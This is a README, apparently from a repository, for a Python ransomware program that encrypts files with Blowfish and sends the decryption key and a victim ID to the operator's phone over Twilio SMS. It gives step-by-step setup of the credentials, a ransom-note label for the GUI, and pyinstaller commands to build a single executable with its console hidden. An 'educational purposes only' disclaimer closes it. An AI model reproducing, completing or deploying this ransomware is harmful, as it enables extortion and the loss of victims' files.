# Ransomware
python ransomware that uses blowfish to encrypt the files and sends the decryption key through SMS using twilio.

## Required installations
- open file location and type **cmd** and **enter** in the top left
- enter these into the command prompt: 
```bash
pip install twilio
```
```bash
pip install pycryptodome
```
## Configuring SMS
- create twilio account at https://www.twilio.com/try-twilio
- on the left under develop, click on phone numbers> manage> active numbers
- create a number
- next click on verified caller IDs and enter and verify your number
- on the top right click on acoount and open API keys and tokens
- you will be able to se your account SID and auth token, you will need these
- you will need to edit this section:
```python
# send key and id number through Twilio SMS
account_sid = 'ENTER ACCOUNT SID HERE'
auth_token = 'ENTER AUTH TOKEN HERE'
client = Client(account_sid, auth_token)
message = client.messages.create(
    body=f'Encryption key: {key}\nID number: {id_number}',
    from_='TWILIO PHONE NUMBER HERE',
    to='YOUR PHONE NUMBER HERE'
)
```
## Additional edits
- you need to customize this line:
```python
 # sms label
    sms_label = tk.Label(root, text="EXAMPLE: SMS YOUREMAIL@.com for decryption key")
    sms_label.pack(pady=5)
```
- this will determine the message that shows at the top of your GUI
    
## Converting to .exe
- open file location and type **cmd** and **enter** in the top left
- enter these into the command prompt: 
```bash
pip install pyinstaller
```
```bash
pyinstaller --onefile -w main.py
```
- **--onefile** makes the exe compact instead of having multiple files
- **-w** hides the command prompt when the it is running
# ⚠️DISCLAIMER/WARNING⚠️
- THIS IS FOR EDUCATIONAL PURPOSES ONLY
- i am not responsible for malicious use of this program or damage caused by it
